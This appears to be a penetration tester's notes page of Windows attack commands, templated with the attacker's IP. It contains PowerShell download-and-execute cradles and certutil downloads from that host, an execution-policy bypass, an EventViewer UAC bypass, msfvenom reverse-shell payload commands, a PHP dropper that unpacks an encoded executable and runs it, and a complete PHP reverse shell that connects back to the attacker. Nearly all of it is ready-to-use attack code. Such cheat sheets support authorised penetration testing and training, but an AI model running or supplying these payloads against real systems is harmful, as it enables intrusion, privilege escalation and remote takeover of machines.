### Drop into PS from CMD
```cmd
powershell -ep bypass
```

### Download file and execute
```powershell
powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://<% tp.frontmatter.my_ip %>/file')
```

### Download file and execute w/ parameters
```powershell
powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<% tp.frontmatter.my_ip %>/file');<command>
```

### Download file PS
```powershell
powershell.exe -command Invoke-WebRequest -Uri 'http://<% tp.frontmatter.my_ip %>/file' -OutFile <location>
```

### Download multiple files PS
```powershell
$baseURL = "https://<% tp.frontmatter.my_ip %>/"
$fileNames = @('files1', 'file2', 'file3')
$downloadPath = "c:\Windows\Tasks"

foreach ($fileName in $fileNames) {
   $url = $baseUrl + $fileName
   $filePath = Join-Path $downloadPath $fileName
   Invoke-WebRequest -Uri $url -OutFile $filePath
   Write-Host "Downloaded $fileName to $filePath"
}
```

### Download file from CMD
```cmd
certutil -urlcache -f http://<% tp.frontmatter.my_ip %>/file <Name on localhost>
```

### Execute PS from CMD
```cmd
powershell -ep bypass -f "file.ps1"
```

### Execute PS from CMD w/ parameters
```cmd
powershell -ep bypass -f "file.ps1" -parameter data
```

### Start a file as its own process
```cmd
Start-Process "<file>"
```

## UAC Bypass
List of lots of UAC bypass techniques
[UAC Bypass](https://github.com/rootm0s/WinPwnage)
Check for UAC
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System 
```
### EventViewer
#### Checks tfor EventViewer
```cmd
strings64.exe -accepteula C:\\Windows\\System32\\eventvwr.exe | findstr /i autoelevate
```
![[Pasted image 20230205124825.png]]

Get EventViewer PS
```bash
wget https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1 -O EventViewer.ps1
```

#### In Powershell
If you have a CMD shell drop into PS or prefix the two PS commands with `powrshell -ep bypass`
```powershell
Import-Module .\Invoke-EventViewer.ps1
```

Create reverse shell on Kali machine and transfer it to windows 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter.my_ip %> LPORT=445 -f exe -o rev.exe
```

In same folder as `rev.exe`
```powershell
Invoke-EventViewer rev.exe
```

## Reverse Shells

### MSFVenom
[Extra payloads](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

#### Non-staged Payloads

```ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter.my_ip %> LPORT=<port> -f aspx > shell.aspx
```

```exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter.my_ip %> LPORT=<port> -f exe -o program.exe
```

```msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter.my_ip %> LPORT=<port> -f msi -o program.msi
```

```dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter.my_ip %> LPORT=port> -f dll > shell.dll
```

#### Staged Payloads

```ASPX
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<% tp.frontmatter.my_ip %> LPORT=<port> -f aspx > shell.aspx
```

```exe
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<% tp.frontmatter.my_ip %> LPORT=<port> -f exe -o program.exe
```

```msi
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<% tp.frontmatter.my_ip %> LPORT=<port> -f msi -o program.msi
```

```dll
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<% tp.frontmatter.my_ip %> LPORT=port> -f dll > shell.dll
```



### Web shells/Web reverse shells

##### PHP 
```php
<?php

header('Content-type: text/plain');

$ip = "<% tp.frontmatter.my_ip %>";

$port = "1234"; //change this

$payload = "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";

$evalCode = gzinflate(base64_decode($payload));

$evalArguments = " ".$port." ".$ip;

$tmpdir ="C:\\windows\\temp";

chdir($tmpdir);

$res .= "Using dir : ".$tmpdir;

$filename = "D3fa1t_shell.exe";

$file = fopen($filename, 'wb');

fwrite($file, $evalCode);

fclose($file);

$path = $filename;

$cmd = $path.$evalArguments;

$res .= "\n\nExecuting : ".$cmd."\n";

echo $res;

$output = system($cmd);

?>
```

##### PHP2
Scroll to the bottom for 
```php
<?php

// Copyright (c) 2020 Ivan Šincek

// v2.5

// Requires PHP v5.0.0 or greater.

// Works on Linux OS, macOS, and Windows OS.

// See the original script at https://github.com/pentestmonkey/php-reverse-shell.

$ip = '<% tp.frontmatter.my_ip %>';
$port = 9001;

class Shell {

private $addr = null;

private $port = null;

private $os = null;

private $shell = null;

private $descriptorspec = array(

0 => array('pipe', 'r'), // shell can read from STDIN

1 => array('pipe', 'w'), // shell can write to STDOUT

2 => array('pipe', 'w') // shell can write to STDERR

);

private $buffer = 1024; // read/write buffer size

private $clen = 0; // command length

private $error = false; // stream read/write error

public function __construct($addr, $port) {

$this->addr = $addr;

$this->port = $port;

}

private function detect() {

$detected = true;

if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS

$this->os = 'LINUX';

$this->shell = '/bin/sh';

} else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {

$this->os = 'WINDOWS';

$this->shell = 'cmd.exe';

} else {

$detected = false;

echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";

}

return $detected;

}

private function daemonize() {

$exit = false;

if (!function_exists('pcntl_fork')) {

echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";

} else if (($pid = @pcntl_fork()) < 0) {

echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";

} else if ($pid > 0) {

$exit = true;

echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";

} else if (posix_setsid() < 0) {

// once daemonized you will actually no longer see the script's dump

echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";

} else {

echo "DAEMONIZE: Completed successfully!\n";

}

return $exit;

}

private function settings() {

@error_reporting(0);

@set_time_limit(0); // do not impose the script execution time limit

@umask(0); // set the file/directory permissions - 666 for files and 777 for directories

}

private function dump($data) {

$data = str_replace('<', '&lt;', $data);

$data = str_replace('>', '&gt;', $data);

echo $data;

}

private function read($stream, $name, $buffer) {

if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream

$this->error = true; // set global error flag

echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";

}

return $data;

}

private function write($stream, $name, $data) {

if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream

$this->error = true; // set global error flag

echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";

}

return $bytes;

}

// read/write method for non-blocking streams

private function rw($input, $output, $iname, $oname) {

while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {

if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length

$this->dump($data); // script's dump

}

}

// read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)

// we must read the exact byte length from a stream and not a single byte more

private function brw($input, $output, $iname, $oname) {

$fstat = fstat($input);

$size = $fstat['size'];

if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {

// for some reason Windows OS pipes STDIN into STDOUT

// we do not like that

// we need to discard the data from the stream

while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {

$this->clen -= $bytes;

$size -= $bytes;

}

}

while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {

$size -= $bytes;

$this->dump($data); // script's dump

}

}

public function run() {

if ($this->detect() && !$this->daemonize()) {

$this->settings();

// ----- SOCKET BEGIN -----

$socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);

if (!$socket) {

echo "SOC_ERROR: {$errno}: {$errstr}\n";

} else {

stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

// ----- SHELL BEGIN -----

$process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);

if (!$process) {

echo "PROC_ERROR: Cannot start the shell\n";

} else {

foreach ($pipes as $pipe) {

stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS

}

// ----- WORK BEGIN -----

$status = proc_get_status($process);

@fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");

do {

$status = proc_get_status($process);

if (feof($socket)) { // check for end-of-file on SOCKET

echo "SOC_ERROR: Shell connection has been terminated\n"; break;

} else if (feof($pipes[1]) || !$status['running']) { // check for end-of-file on STDOUT or if process is still running

echo "PROC_ERROR: Shell process has been terminated\n"; break; // feof() does not work with blocking streams

} // use proc_get_status() instead

$streams = array(

'read' => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR

'write' => null,

'except' => null

);

$num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS

if ($num_changed_streams === false) {

echo "STRM_ERROR: stream_select() failed\n"; break;

} else if ($num_changed_streams > 0) {

if ($this->os === 'LINUX') {

if (in_array($socket , $streams['read'])) { $this->rw($socket , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN

if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET

if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET

} else if ($this->os === 'WINDOWS') {

// order is important

if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN

if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET

if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET

}

}

} while (!$this->error);

// ------ WORK END ------

foreach ($pipes as $pipe) {

fclose($pipe);

}

proc_close($process);

}

// ------ SHELL END ------

fclose($socket);

}

// ------ SOCKET END ------

}

}

}

echo '<pre>';

// change the host address and/or port number as necessary

$sh = new Shell($ip, $port);

$sh->run();

unset($sh);

// garbage collector requires PHP v5.3.0 or greater

// @gc_collect_cycles();

echo '</pre>';

?>
```